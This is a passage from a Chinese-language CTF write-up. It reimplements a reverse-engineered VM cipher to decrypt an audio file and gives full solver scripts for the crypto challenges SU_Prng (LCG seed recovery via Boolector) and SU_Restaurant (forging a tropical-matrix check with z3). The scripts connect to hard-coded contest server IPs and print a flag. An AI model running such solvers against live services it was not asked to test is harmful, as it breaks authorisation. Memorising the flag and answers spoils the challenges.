def key_schedule(K, sum0):
    """Update 8-word key state K using sum0, return updated K"""
    K = list(K)
    K[0] = u32(rotl32(K[1] ^ sum0, 3) + K[0])
    K[1] = u32(rotl32(K[2] ^ K[0], 5) + K[1])
    K[2] = u32(rotl32(K[3] ^ K[1], 7) + K[2])
    K[3] = u32(rotl32(K[4] ^ K[2], 11) + K[3])
    K[4] = u32(rotl32(K[5] ^ K[3], 13) + K[4])
    K[5] = u32(rotl32(K[6] ^ K[4], 17) + K[5])
    K[6] = u32(rotl32(K[7] ^ K[5], 19) + K[6])
    K[7] = u32(rotl32(K[0] ^ K[6], 23) + K[7])
    return K

def derive_subkeys(K, sum0):
    """Derive round subkeys from key state"""
    # Round keys (rk0..rk3) -- used in Speck-like step
    rk0 = u32((K[0] ^ K[2]) ^ sum0)
    rk1 = u32((K[1] ^ K[3]) ^ u32(sum0 + CONST_K1))
    rk2 = u32((K[4] ^ K[6]) ^ u32(sum0 + CONST_K2))
    rk3 = u32((K[5] ^ K[7]) ^ u32(sum0 + CONST_K3))
    
    # Sum keys (sk0..sk3) -- used in TEA-like step
    sk0 = u32(K[0] + K[4])
    sk1 = u32(K[1] + K[5])
    sk2 = u32(K[2] + K[6])
    sk3 = u32(K[3] + K[7])
    
    # XOR keys (xk0..xk3) -- used in TEA-like step
    xk0 = u32(K[0] ^ K[5])
    xk1 = u32(K[1] ^ K[6])
    xk2 = u32(K[2] ^ K[7])
    xk3 = u32(K[3] ^ K[4])
    
    return (rk0, rk1, rk2, rk3), (sk0, sk1, sk2, sk3), (xk0, xk1, xk2, xk3)

def speck_like_encrypt(L, R, rk):
    """Speck-like round: L,R pair with round key"""
    # L = ror(L, 8) + R; L ^= rk
    # R = rol(R, 3); R ^= L
    L = u32(rotr32(L, 8) + R)
    L = u32(L ^ rk)
    R = u32(rotl32(R, 3) ^ L)
    return L, R

def speck_like_decrypt(L, R, rk):
    """Inverse of speck_like_encrypt"""
    R = u32(rotl32(R ^ L, 32 - 3))  # undo: R = rol(R,3)^L => R_orig = ror(R^L, 3)
    L = u32(L ^ rk)                 # undo: L ^= rk
    L = u32(L - R)                  # undo: L = ror(L,8) + R => L_orig = rol(L - R, 8)
    L = rotl32(L, 8)
    return L, R

def tea_like_mix(data, sum1, sk, xk):
    """TEA/XTEA-like mixing step producing 8 output words"""
    # data = 8 words (4 pairs after Speck step)
    # d[0..7] in offsets 72..100 (after speck), i.e. the current right half
    d = list(data)
    out = [0] * 8
    
    # For each of 8 output words:
    # out[i] = ((d[i%8] << 4) ^ (d[i%8] >> 5)) + d[(i+1)%8]) ^ (sum1 + sk[i%4]) + (rol(d[(i+2)%8], i+1) ^ (sum1 >> (i+1)))
    # Actually from the decompiled code, the pattern is more specific:
    
    # out[0] = (((d[0]<<4 ^ d[0]>>5) + d[1]) ^ (sum1 + sk[0])) + (rol(d[3], 1) ^ (sum1>>1))
    # out[1] = (((d[1]<<4 ^ d[1]>>5) + d[2]) ^ (sum1 + sk[1])) + (rol(d[4], 2) ^ (sum1>>2))
    # out[2] = (((d[2]<<4 ^ d[2]>>5) + d[3]) ^ (sum1 + sk[2])) + (rol(d[5], 3) ^ (sum1>>3))
    # out[3] = (((d[3]<<4 ^ d[3]>>5) + d[4]) ^ (sum1 + sk[3])) + (rol(d[6], 4) ^ (sum1>>4))
    # out[4] = (((d[4]<<4 ^ d[4]>>5) + d[5]) ^ (sum1 + xk[0])) + (rol(d[7], 5) ^ (sum1>>5))
    # out[5] = (((d[5]<<4 ^ d[5]>>5) + d[6]) ^ (sum1 + xk[1])) + (rol(d[0], 6) ^ (sum1>>6))
    # out[6] = (((d[6]<<4 ^ d[6]>>5) + d[7]) ^ (sum1 + xk[2])) + (rol(d[1], 7) ^ (sum1>>7))
    # out[7] = (((d[7]<<4 ^ d[7]>>5) + d[0]) ^ (sum1 + xk[3])) + (rol(d[2], 8) ^ (sum1>>0))
    
    keys_8 = [sk[0], sk[1], sk[2], sk[3], xk[0], xk[1], xk[2], xk[3]]
    # Second operand indices: d[3],d[4],d[5],d[6],d[7],d[0],d[1],d[2]
    second_idx = [3, 4, 5, 6, 7, 0, 1, 2]
    rot_amounts = [1, 2, 3, 4, 5, 6, 7, 8]
    shr_amounts = [1, 2, 3, 4, 5, 6, 7, 0]
    
    for i in range(8):
        a = d[i]
        b = d[(i + 1) % 8]
        c = d[second_idx[i]]
        k = keys_8[i]
        
        part1 = u32(u32(u32(a << 4) ^ (a >> 5)) + b)
        part1 = u32(u32(sum1 + k) ^ part1)
        part2 = u32(rotl32(c, rot_amounts[i]) ^ (sum1 >> shr_amounts[i]))
        out[i] = u32(part1 + part2)
    
    return out

def encrypt_block(block_bytes, key_state):
    """Encrypt a 64-byte block. Returns (encrypted_bytes, updated_key_state)"""
    # Parse input as 16 big-endian uint32s
    words = list(struct.unpack('>16I', block_bytes))
    
    # Split into left (L: words 0-7) and right (R: words 8-15)  
    # In VM: offsets 40-68 = L (prev right), offsets 72-100 = R (current data after bswap)
    # Initial: L = prev_key_feedback, R = bswap(input[0:8])
    # Wait - let me re-read the decompiled code more carefully
    
    # Actually from the decompiled bytecode:
    # After bswap, 16 words go to:
    #   MEM32[r15+40..68] = bswap(input[0..7])   <- "left half" 
    #   MEM32[r15+72..100] = bswap(input[8..15])  <- "right half"
    # Then key state K is copied to working copy at offsets 104-132
    
    K = list(key_state)
    
    # The 16 input words (after bswap from LE to BE)
    L = list(words[0:8])   # left half at offsets 40-68
    R = list(words[8:16])  # right half at offsets 72-100
    
    sum0 = CONST_INIT  # offset 216
    sum1 = 0           # offset 220
    
    for rnd in range(4):
        # Update sum0 and sum1
        sum0 = u32(sum0 + DELTA_INC[rnd])
        sum1 = u32(sum1 + DELTA)
        
        # Key schedule
        K = key_schedule(K, sum0)
        
        # Derive subkeys
        rk, sk, xk = derive_subkeys(K, sum0)
        
        # Speck-like encryption on 4 pairs of right half
        R[0], R[1] = speck_like_encrypt(R[0], R[1], rk[0])
        R[2], R[3] = speck_like_encrypt(R[2], R[3], rk[1])
        R[4], R[5] = speck_like_encrypt(R[4], R[5], rk[2])
        R[6], R[7] = speck_like_encrypt(R[6], R[7], rk[3])
        
        # TEA-like mixing
        mix = tea_like_mix(R, sum1, sk, xk)
        
        # Feistel: new_R = L ^ mix, new_L = old_R
        new_R = [u32(L[i] ^ mix[i]) for i in range(8)]
        new_L = list(R)
        
        L = new_L
        R = new_R
    
    # After 4 rounds, output:
    # Write L (offsets 40-68) and R (offsets 72-100) back with bswap
    # Then update key: key[i] = bswap(output[i] ^ output[i+8]) for i in 0..7
    
    # Output bytes
    out_words = L + R
    out_bytes = struct.pack('>16I', *out_words)
    
    # Key feedback: output buffer stores bswap(L[i]) and bswap(R[i]) (LE format)
    # Then key_new[i] = bswap(bswap(L[i]) ^ bswap(R[i+8]))
    # Note: L is words 0-7, R is words 8-15 in output (offsets 40-68 and 72-100)
    new_key = [bswap32(u32(bswap32(L[i]) ^ bswap32(R[i]))) for i in range(8)]
    
    return out_bytes, new_key

def decrypt_block(block_bytes, key_state):
    """Decrypt a 64-byte block. Returns (decrypted_bytes, key_state_for_next)"""
    words = list(struct.unpack('>16I', block_bytes))
    
    K_orig = list(key_state)
    
    L = list(words[0:8])
    R = list(words[8:16])
    
    # We need to reverse 4 rounds
    # First, compute all round keys (forward)
    sum0 = CONST_INIT
    sum1 = 0
    
    round_data = []
    K = list(K_orig)
    for rnd in range(4):
        sum0 = u32(sum0 + DELTA_INC[rnd])
        sum1 = u32(sum1 + DELTA)
        K = key_schedule(K, sum0)
        rk, sk, xk = derive_subkeys(K, sum0)
        round_data.append((rk, sk, xk, sum1))
    
    # Now decrypt in reverse order
    for rnd in range(3, -1, -1):
        rk, sk, xk, sum1_val = round_data[rnd]
        
        # Undo Feistel: L was old_R, R was L_orig ^ mix
        # So: old_R = L (current), old_L needs mix
        old_R = list(L)  # this was the R after speck in forward
        
        # We need to undo speck on old_R to get the R_before_speck
        # But wait - mix was computed from R (after speck), which is now L
        # Recompute mix from L (which was R after speck)
        mix = tea_like_mix(L, sum1_val, sk, xk)
        
        # old_L = R ^ mix
        old_L = [u32(R[i] ^ mix[i]) for i in range(8)]
        
        # Now undo Speck on old_R (which is current L)
        old_R[0], old_R[1] = speck_like_decrypt(old_R[0], old_R[1], rk[0])
        old_R[2], old_R[3] = speck_like_decrypt(old_R[2], old_R[3], rk[1])
        old_R[4], old_R[5] = speck_like_decrypt(old_R[4], old_R[5], rk[2])
        old_R[6], old_R[7] = speck_like_decrypt(old_R[6], old_R[7], rk[3])
        
        L = old_L
        R = old_R
    
    out_words = L + R
    out_bytes = struct.pack('>16I', *out_words)
    
    # Key feedback for next block uses the ENCRYPTED data (ciphertext)
    # Same formula as encrypt: key_new[i] = bswap(bswap(L_enc[i]) ^ bswap(R_enc[i]))
    enc_L = list(words[0:8])
    enc_R = list(words[8:16])
    new_key = [bswap32(u32(bswap32(enc_L[i]) ^ bswap32(enc_R[i]))) for i in range(8)]
    
    return out_bytes, new_key

def encrypt_data(data):
    """Encrypt data using the VM cipher"""
    # Pad to 64-byte boundary
    orig_len = len(data)
    pad_len = (64 - (orig_len % 64)) % 64
    if pad_len == 0:
        pad_len = 64  # always pad? No - check VM code
    # Actually from VM: r4 = r13 + r3 where r3 = 64 - r2, r2 = r13 - (r13/64)*64
    # If r2 == 0: r3 = 64, so it adds 64 bytes padding even if aligned
    # Wait no: r2 = r13 mod 64. If r2==0, r3=64, padded_size = orig+64
    # But then padding bytes are filled with value r3
    remainder = orig_len % 64
    if remainder == 0:
        pad_val = 64
    else:
        pad_val = 64 - remainder
    padded = data + bytes([pad_val] * pad_val)
    
    key = [0x00010203, 0x04050607, 0x08090a0b, 0x0c0d0e0f,
           0x10111213, 0x14151617, 0x18191a1b, 0x1c1d1e1f]
    
    result = b''
    for i in range(0, len(padded), 64):
        block = padded[i:i+64]
        # VM internally does: LOAD32 (reads LE from memory) then bswap to get BE
        # This is equivalent to reading the raw bytes as big-endian uint32s
        # So we pass the raw block bytes directly to encrypt_block which works in BE
        enc_block, key = encrypt_block(block, key)
        result += enc_block
    
    return result

def decrypt_data(data):
    """Decrypt data using the VM cipher"""
    key = [0x00010203, 0x04050607, 0x08090a0b, 0x0c0d0e0f,
           0x10111213, 0x14151617, 0x18191a1b, 0x1c1d1e1f]
    
    result = b''
    for i in range(0, len(data), 64):
        block = data[i:i+64]
        dec_block, key = decrypt_block(block, key)
        result += dec_block
    
    return result

def debug_encrypt_block(block_bytes, key_state):
    """Encrypt one block with detailed state dumps for debugging"""
    words = list(struct.unpack('>16I', block_bytes))
    K = list(key_state)
    L = list(words[0:8])
    R = list(words[8:16])
    
    print(f"Input L (state 40-68): {[f'0x{x:08x}' for x in L]}")
    print(f"Input R (state 72-100): {[f'0x{x:08x}' for x in R]}")
    print(f"Initial key (state 104-132): {[f'0x{x:08x}' for x in K]}")
    
    sum0 = CONST_INIT
    sum1 = 0
    
    for rnd in range(4):
        sum0 = u32(sum0 + DELTA_INC[rnd])
        sum1 = u32(sum1 + DELTA)
        print(f"\n--- Round {rnd} ---")
        print(f"  sum0=0x{sum0:08x} sum1=0x{sum1:08x}")
        
        K = key_schedule(K, sum0)
        print(f"  K after sched: {[f'0x{x:08x}' for x in K]}")
        
        rk, sk, xk = derive_subkeys(K, sum0)
        print(f"  rk={[f'0x{x:08x}' for x in rk]}")
        print(f"  sk={[f'0x{x:08x}' for x in sk]}")
        print(f"  xk={[f'0x{x:08x}' for x in xk]}")
        
        R[0], R[1] = speck_like_encrypt(R[0], R[1], rk[0])
        R[2], R[3] = speck_like_encrypt(R[2], R[3], rk[1])
        R[4], R[5] = speck_like_encrypt(R[4], R[5], rk[2])
        R[6], R[7] = speck_like_encrypt(R[6], R[7], rk[3])
        print(f"  R after speck: {[f'0x{x:08x}' for x in R]}")
        
        mix = tea_like_mix(R, sum1, sk, xk)
        print(f"  mix: {[f'0x{x:08x}' for x in mix]}")
        
        new_R = [u32(L[i] ^ mix[i]) for i in range(8)]
        new_L = list(R)
        L = new_L
        R = new_R
        print(f"  L after feistel: {[f'0x{x:08x}' for x in L]}")
        print(f"  R after feistel: {[f'0x{x:08x}' for x in R]}")
    
    print(f"\nFinal L: {[f'0x{x:08x}' for x in L]}")
    print(f"Final R: {[f'0x{x:08x}' for x in R]}")
    out_words = L + R
    out_bytes = struct.pack('>16I', *out_words)
    return out_bytes

if __name__ == '__main__':
    print("Testing VM cipher implementation...")
    
    # Test roundtrip
    test_data = bytes(range(256)) * 4
    encrypted = encrypt_data(test_data)
    decrypted = decrypt_data(encrypted)
    
    # Strip padding
    if decrypted[:len(test_data)] == test_data:
        print("SUCCESS: encrypt->decrypt roundtrip works!")
    else:
        print("FAIL: roundtrip mismatch")
    
    # Debug: encrypt first block of native_wave_input.bin
    import os
    if os.path.exists('native_wave_input.bin'):
        wave = open('native_wave_input.bin', 'rb').read()
        native_enc = open('native_encrypted_payload.bin', 'rb').read()
        
        print(f"\n=== Debug encrypt first block ===")
        key = [0x00010203, 0x04050607, 0x08090a0b, 0x0c0d0e0f,
               0x10111213, 0x14151617, 0x18191a1b, 0x1c1d1e1f]
        
        # Pad the input
        remainder = len(wave) % 64
        pad_val = 64 - remainder if remainder else 64
        padded = wave + bytes([pad_val] * pad_val)
        
        block = padded[:64]
        result = debug_encrypt_block(block, key)
        
        print(f"\nPython output block 0: {result.hex()}")
        print(f"Native output block 0: {native_enc[:64].hex()}")
        print(f"Match: {result == native_enc[:64]}")
```

解出wav音频

```Python
"""Decrypt ddd.su_mv_enc -> WAV audio file"""
import struct
import hashlib
from vm_cipher import decrypt_data

enc_data = open('ddd.su_mv_enc', 'rb').read()
payload = enc_data[4:]  # strip SVE4 header

decrypted = decrypt_data(payload)

# Remove padding
pad_val = decrypted[-1]
if 1 <= pad_val <= 64 and all(b == pad_val for b in decrypted[-pad_val:]):
    wav = decrypted[:-pad_val]
else:
    wav = decrypted

with open('decrypted_audio.wav', 'wb') as f:
    f.write(wav)

md5 = hashlib.md5(wav).hexdigest()
print(f"Saved: decrypted_audio.wav ({len(wav)} bytes)")
print(f"Format: {wav[:4]} / {wav[8:12]}")
print(f"MD5: {md5}")

# SUCTF{16ac79d3510d6ea4b5338fade80459b8}
```

# Crypto

## SU_Prng

题目附件

```Python
from hashlib import md5
from random import randint
import signal
from secret import flag

bits = 256
outs = 56

ror = lambda x, k, n: ((x >> (k % n)) | (x << (n - k % n))) & ((1 << n) - 1)

class LCG:
    def __init__(self, seed, a, b):
        self.seed = seed
        self.a = a
        self.b = b
        self.m = 2**bits

    def next(self):
        self.seed = (self.seed * self.a + self.b) % self.m
        return ror((self.seed >> bits // 2) ^ (self.seed % 2**(bits // 2)), self.seed >> bits - 250, bits)

signal.alarm(15)

a = randint(1, 1 << bits)
b = randint(1, 1 << bits)
seed = randint(1, 1 << bits)
lcg = LCG(seed, a, b)
print(f'{a = }')
print(f'out = {[lcg.next() for _ in [0] * outs]}')
print(f'h = {md5(str(seed).encode()).hexdigest()}')

if int(input('> ')) == seed:
    print('Correct!')
    print(flag)
```

题目给出：

- 256 位乘子 `a`
- 56 个输出
- `md5(str(seed))`

目标是恢复初始 `seed`。

**观察**

状态递推是一个标准的模 `2^256` 的 LCG：

```Plain
s_{i+1} = a s_i + b mod 2^256
```

输出函数写成数学形式是：

```Plain
out_i = ROR( (hi(s_i) xor lo(s_i)), rot_i )
rot_i = (s_i >> 250) = s_i[13:6]
```

其中 `hi/lo` 分别表示高 128 位和低 128 位。

**漏洞点**

最关键的问题在这里：

```Python
(self.seed >> 128) ^ (self.seed % 2**128)
```

这个值实际上只有 **128 位**，因为它只是高半和低半的异或。

但题目把它丢进了一个 **256 位旋转**：

```Plain
ROR(mix128, rot, 256)
```

也就是说，每个输出都来自一个“高 128 位全 0”的 256 位数。

于是可以对每个输出枚举旋转量 `r`，检查：

```Plain
ROL(out, r)
```

是否满足高 128 位为 0。满足时，该 `r` 就是合法候选。

这一步直接把旋转层拆掉了。

**第一步：恢复低 14 位轨迹**

旋转量来自状态的第 6 到第 13 位，所以一旦某轮输出的旋转量候选为 `r_i`，就有：

```Plain
s_i mod 2^14 ∈ { (r_i << 6) + t | 0 <= t < 64 }
```

另一方面，LCG 在模 `2^14` 下仍然成立：

```Plain
x_{i+1} = a x_i + b mod 2^14
```

因此可以直接在 `mod 2^14` 上恢复整条轨迹：

1. 枚举 `x_1, x_2`
2. 由两项解出 `b mod 2^14`
3. 向后递推 56 轮
4. 检查每轮是否落在候选集合里

这会把每一轮状态低 14 位固定下来。

**第二步：利用`v2(a)` 的 2-adic 收缩**

令：

```Plain
a = 2^k * u,  u 为奇数
```

其中 `k = v2(a)`。

在模 `2^n` 下，每乘一次 `a`，就会多“吃掉” `k` 位关于初始状态的依赖。

于是：

- 低 128 位大约在 `ceil(128 / k)` 轮后固定
- 整个 256 位状态大约在 `ceil(256 / k)` 轮后固定

这也是为什么远端有些实例会出现尾部很多个输出完全相同：状态已经掉进固定点。

**第三步：从固定点反推**

如果尾部状态已经固定为 `s*`，则：

```Plain
s* = a s* + b mod 2^256
```

所以：

```Plain
b = (1 - a) s* mod 2^256
```

只要知道固定点状态，就能直接得到 `b`。

而固定点状态可以从尾部相同输出恢复：

1. 枚举尾部输出的合法旋转量
2. 旋回得到 `mix = hi xor lo`
3. 用固定点区的递推约束解出固定的低半部分 `x*`
4. 再由 `hi = x* xor mix` 得到完整固定点状态

接下来就可以逆推整条状态链。

**第四步：逆推状态**

已知：

```Plain
s_{i+1} = a s_i + b mod 2^256
```

若 `a = 2^k u`，则从 `s_{i+1}` 回推 `s_i` 时，逆像个数恰好是 `2^k` 个。

对于 easy instance，`k` 往往不大，比如 7、8、11。

于是每次回推只需要检查最多 `2^k` 个候选，并用该轮真实输出筛选，通常能压成唯一前驱。

这样就能从尾部一路回到 `s_1`，最后再由：

```Plain
s_1 = a * seed + b mod 2^256
```

恢复 `seed`。

**第五步：MD5 收尾**

题目还额外给了：

```Plain
md5(str(seed))
```

这基本就是最终校验器。

即使最后一步还残留少量候选，也可以直接用 MD5 锁定唯一正确的 `seed`。

**利用策略**

并不是所有实例都适合在线硬解。

最稳的打法是：

1. 重连服务
2. 读取 `a` 和输出
3. 计算 `v2(a)`
4. 观察输出尾部是否已经长时间恒定
5. 只对“easy instance”启动完整求解

我最终打通的是：

- `v2(a) = 8`
- 尾部 25 个输出完全相同

这类实例已经有很明显的固定点结构，足以在时限内完成恢复。

**Exp**

```Python
#!/usr/bin/env python3
import ast
import hashlib
import multiprocessing as mp
import os
import queue
import re
import socket
import sys
import time

from pyboolector import Boolector, BtorOption

HOST = "1.95.115.179"
PORT = 10000
BITS = 256
HALF = 128
MASK = (1 << BITS) - 1

def rol(x: int, r: int) -> int:
    r %= BITS
    if r == 0:
        return x
    return ((x << r) | (x >> (BITS - r))) & MASK

def ror(x: int, k: int) -> int:
    k %= BITS
    return ((x >> k) | (x << (BITS - k))) & MASK

def v2(x: int) -> int:
    c = 0
    while x & 1 == 0:
        x >>= 1
        c += 1
    return c

def tail_run(arr: list[int]) -> int:
    x = arr[-1]
    c = 0
    for y in reversed(arr):
        if y == x:
            c += 1
        else:
            break
    return c

def parse_instance(text: str):
    a = int(re.search(r"a\s*=\s*(\d+)", text).group(1))
    outs = ast.literal_eval(re.search(r"out\s*=\s*(\[[^\n]+\])", text).group(1))
    h = re.search(r"h\s*=\s*([0-9a-f]{32})", text).group(1)
    return a, outs, h

def candidate_rotations(out: int) -> list[int]:
    res = []
    for r in range(256):
        x = rol(out, r)
        if x >> HALF == 0:
            res.append(r)
    return res

def precompute(instance):
    a, outs, md5_target = instance
    k = v2(a)
    start = (HALF + k - 1) // k
    aa = a >> k
    uinv = pow(aa, -1, 1 << BITS)
    step = (uinv * (1 << (BITS - k))) & MASK
    return k, start, uinv, step

def output_of(state: int) -> int:
    return ror((state >> HALF) ^ (state & ((1 << HALF) - 1)), state >> 6)

def backtrack_seed(a: int, outs: list[int], md5_target: str, k: int, uinv: int, step: int, xval: int, r: int):
    mixes = [rol(o, r) & ((1 << HALF) - 1) for o in outs]
    sstar = (((xval ^ mixes[-1]) << HALF) | xval) & MASK
    bval = ((1 - a) * sstar) & MASK

    def preimages(sp: int):
        y = (sp - bval) & MASK
        if y & ((1 << k) - 1):
            return []
        base = (uinv * (y >> k)) & MASK
        return [(base + i * step) & MASK for i in range(1 << k)]

    cur = sstar
    for idx in range(len(outs) - 2, -1, -1):
        good = []
        for cand in preimages(cur):
            if output_of(cand) == outs[idx]:
                good.append(cand)
                if len(good) > 1:
                    break
        if len(good) != 1:
            return None
        cur = good[0]

    for cand in preimages(cur):
        if hashlib.md5(str(cand).encode()).hexdigest() == md5_target:
            return cand
    return None

def worker(instance, r: int, bucket_bits: int, bucket_value: int, result_queue):
    a, outs, md5_target = instance
    k, start, uinv, step = precompute(instance)
    a0 = a & ((1 << HALF) - 1)
    mixes = [rol(o, r) & ((1 << HALF) - 1) for o in outs]

    b = Boolector()
    b.Set_opt(BtorOption.BTOR_OPT_MODEL_GEN, 1)
    b.Set_opt(BtorOption.BTOR_OPT_INCREMENTAL, 1)
    s128 = b.BitVecSort(HALF)
    x = b.Var(s128, "x")
    a0v = b.Const(a0, HALF)

    for n in range(start, len(outs) - 2):
        t0 = x ^ b.Const(mixes[n], HALF)
        t1 = x ^ b.Const(mixes[n + 1], HALF)
        t2 = x ^ b.Const(mixes[n + 2], HALF)
        b.Assert(t2 - (a0v * t1) == t1 - (a0v * t0))

    b.Assert(x[13:6] == b.Const(r, 8))
    if bucket_bits:
        b.Assert(x[bucket_bits - 1 : 0] == b.Const(bucket_value, bucket_bits))

    while True:
        res = b.Sat()
        if res != b.SAT:
            return
        xval = int(x.assignment, 2)
        seed = backtrack_seed(a, outs, md5_target, k, uinv, step, xval, r)
        if seed is not None:
            result_queue.put(seed)
            return

        bits = x.assignment
        clause = None
        for idx, ch in enumerate(bits):
            bit = x[127 - idx : 127 - idx]
            lit = bit != b.Const(int(ch), 1)
            clause = lit if clause is None else clause | lit
        b.Assert(clause)

def solve_instance(instance, parallel_buckets=8, wait_timeout=14.4):
    a, outs, _ = instance
    k = v2(a)
    if k == 0:
        return None
    tail = tail_run(outs)
    fixed_from = (BITS + k - 1) // k
    if k < 7 or tail < len(outs) - fixed_from + 1:
        return None

    candidates = candidate_rotations(outs[-1])
    good_r = None
    for r in candidates:
        mixes = [rol(o, r) & ((1 << HALF) - 1) for o in outs]
        a0 = a & ((1 << HALF) - 1)
        start = (HALF + k - 1) // k
        b = Boolector()
        b.Set_opt(BtorOption.BTOR_OPT_MODEL_GEN, 1)
        s128 = b.BitVecSort(HALF)
        x = b.Var(s128, "x")
        a0v = b.Const(a0, HALF)
        for n in range(start, len(outs) - 2):
            t0 = x ^ b.Const(mixes[n], HALF)
            t1 = x ^ b.Const(mixes[n + 1], HALF)
            t2 = x ^ b.Const(mixes[n + 2], HALF)
            b.Assert(t2 - (a0v * t1) == t1 - (a0v * t0))
        b.Assert(x[13:6] == b.Const(r, 8))
        if b.Sat() == b.SAT:
            good_r = r
            break

    if good_r is None:
        return None

    ctx = mp.get_context("fork")
    result_queue = ctx.Queue()
    procs = []
    bucket_bits = (parallel_buckets - 1).bit_length() - 1
    for bucket in range(1 << bucket_bits):
        p = ctx.Process(target=worker, args=(instance, good_r, bucket_bits, bucket, result_queue))
        p.daemon = True
        p.start()
        procs.append(p)

    seed = None
    try:
        seed = result_queue.get(timeout=wait_timeout)
    except queue.Empty:
        seed = None
    finally:
        for p in procs:
            if p.is_alive():
                try:
                    p.kill()
                except AttributeError:
                    p.terminate()
        for p in procs:
            p.join(timeout=0.2)
    return seed

def recv_until_prompt(sock: socket.socket) -> str:
    data = b""
    while b"> " not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data.decode()

def main():
    if len(sys.argv) == 2:
        instance = parse_instance(open(sys.argv[1], "r", encoding="utf-8").read())
        start = time.time()
        seed = solve_instance(instance)
        print(f"seed={seed}")
        print(f"elapsed={time.time() - start:.3f}")
        return

    mp.set_start_method("fork", force=True)
    attempts = 0
    while True:
        attempts += 1
        sock = socket.create_connection((HOST, PORT), timeout=3)
        sock.settimeout(3)
        text = recv_until_prompt(sock)
        instance = parse_instance(text)
        a, outs, _ = instance
        k = v2(a)
        tail = tail_run(outs)
        print(f"attempt={attempts} v2={k} tail={tail}", flush=True)
        seed = solve_instance(instance)
        if seed is None:
            sock.close()
            continue
        sock.sendall(str(seed).encode() + b"\n")
        try:
            resp = sock.recv(4096).decode(errors="replace")
        except Exception:
            resp = ""
        print(resp)
        if "Correct!" in resp:
            try:
                more = sock.recv(4096).decode(errors="replace")
            except Exception:
                more = ""
            print(more)
            break
        sock.close()

if __name__ == "__main__":
    main()
```

## **SU_Restaurant**

题目核心类有两个：

- `Point`：定义了“加法”和“乘法”
- `Block`：定义了矩阵加法和矩阵乘法

但这里的运算并不是普通矩阵运算，而是一个 min-plus 半环：

```Python
class Point:
    def __add__(self, other):
        return Point(min(self.x, other.x))

    def __mul__(self, other):
        return Point(self.x + other.x)
```

因此：

- 标量“加法”其实是 `min`
- 标量“乘法”其实是普通整数加法
- 矩阵乘法就是 tropical matrix multiplication（热带矩阵乘法）

也就是：

```Plain
(A * B)[i][j] = min_k (A[i][k] + B[k][j])
```

程序初始化时会随机生成：

- `chef`：`8 x 7`
- `cooker`：`7 x 8`
- `fork = chef * cooker`：`8 x 8`

**点餐接口**

选项 `1` 会返回某个食物名 `msg` 对应的一组数据：

```Plain
A = M * chef (+) U
B = cooker * M (+) V
P = chef * V
R = U * cooker
S = U * V
```

这里：

- `M` 由 `msg` 的 `sha3_512` 哈希切成 `8 x 8`
- `(+)=min`
- `U` 是 `8 x 7` 随机矩阵
- `V` 是 `7 x 8` 随机矩阵

**拿 flag 接口**

选项 `2` 会给出一个随机的 36 字符串 `Fo0dN4mE`，要求我们提交 `A,B,P,R,S`，服务端验证：

```Plain
W = A * B
Z = (M * fork * M) + (M * P) + (R * M) + S
```

若满足：

- `W == Z`
- `W != S`
- 所有元素在 `[0, 256]`
- `rank(A) >= 7`
- `rank(B) >= 7`
- `rank(P), rank(R), rank(S) >= 8`

即可得到 flag。

注意这个 `rank` 是用 `numpy.linalg.matrix_rank` 在普通实数矩阵意义下算的，不是 tropical rank。

**关键恒等式**

从点餐接口的定义直接展开：

```Plain
A = M*chef (+) U
B = cooker*M (+) V
```

于是：

```Plain
A * B
= (M*chef (+) U) * (cooker*M (+) V)
= M*chef*cooker*M (+) M*chef*V (+) U*cooker*M (+) U*V
= M*fork*M (+) M*P (+) R*M (+) S
```

这正好就是服务端检查的 `Z`。

所以只要我们能构造出某组 `chef,cooker,U,V`，再按定义生成：

- `A = M*chef (+) U`
- `B = cooker*M (+) V`
- `P = chef*V`
- `R = U*cooker`
- `S = U*V`

就一定满足 `W == Z`。

问题就变成：如何在当前连接中恢复一组与服务端样本一致的 `chef,cooker`。

**漏洞利用思路**

**1. 单连接内拿两组样本**

每次新连接都会重新随机生成：

- `chef`
- `cooker`

所以不能跨连接收集数据，必须在同一条连接里先点两次餐，拿到两组：

```Plain
(M1, A1, B1, P1, R1, S1)
(M2, A2, B2, P2, R2, S2)
```

两组样本满足：

```Plain
A1 = M1*chef (+) U1
B1 = cooker*M1 (+) V1
P1 = chef*V1
R1 = U1*cooker
S1 = U1*V1

A2 = M2*chef (+) U2
B2 = cooker*M2 (+) V2
P2 = chef*V2
R2 = U2*cooker
S2 = U2*V2
```

这些都是关于未知量的 min-plus 约束。

**2. 用 z3 求一组一致模型**

虽然真实的 `chef,cooker` 未必唯一，但我们不需要恢复“真正那一组”，只需要恢复一组：

- 满足两份样本
- 在目标消息 `M` 上可用于构造合法提交

把所有未知量建模为整数变量：

- `chef[8][7]`
- `cooker[7][8]`
- `U1,V1,U2,V2`

并把 “某个值是若干表达式的最小值” 写成：

```Plain
val <= 每个候选项
且 val == 某个候选项
```

例如：

```Plain
A[i][j] = min(M[i][0]+chef[0][j], ..., M[i][7]+chef[7][j], U[i][j])
```

编码为：

```Plain
A[i][j] <= t for all t
and A[i][j] == one of t
```

这样 z3 很快就能解出一组与样本一致的 `chef,cooker`。

**3. 对目标消息重新构造一组`U,V`**

目标消息给出后，先算：

```Plain
M = H(Fo0dN4mE)
```

然后随机搜索 `U,V`，构造：

```Plain
A = M*chef (+) U
B = cooker*M (+) V
P = chef*V
R = U*cooker
S = U*V
```

由于等式恒成立，只需要继续筛掉不满足以下条件的候选：

- 元素都在 `[0,256]`
- `rank(A) >= 7`
- `rank(B) >= 7`
- `rank(P), rank(R), rank(S) >= 8`
- `W != S`

这里我采用分层随机：

- 小范围先搜
- 不行就逐步放大到更大的整数范围

最后找到一组可过检查的数据并提交。

**为什么这种方法可行**

题目的设计里有一个明显错位：

- 逻辑校验使用的是 tropical/min-plus 代数
- 线性代数限制使用的是普通实数矩阵的秩

这两个结构没有统一起来，导致我们可以：

1. 在 tropical 结构里伪造一组合法分解
2. 再通过随机搜索把它调整成普通矩阵意义下“看起来满秩”

也就是说，服务端并没有验证你提交的数据是否来自它内部真实的 `chef,cooker`，只验证了它们是否能在 tropical 恒等式下自洽。

完整脚本如下：

```Python
import ast
import json
import random
import re
from hashlib import sha3_512

import numpy as np
from pwn import remote
from z3 import And, Int, Or, Solver, sat

HOST = "101.245.107.149"
PORTS = [10020, 10019]
FOODS = [
    "Spring rolls",
    "Red Rice Rolls",
    "Chencun Rice Noodles",
    "Egg Tart",
    "Cha siu bao",
]

def H(x):
    if isinstance(x, str):
        x = x.encode()
    raw = [int(sha3_512(x).hexdigest()[i : i + 2], 16) for i in range(0, 128, 2)]
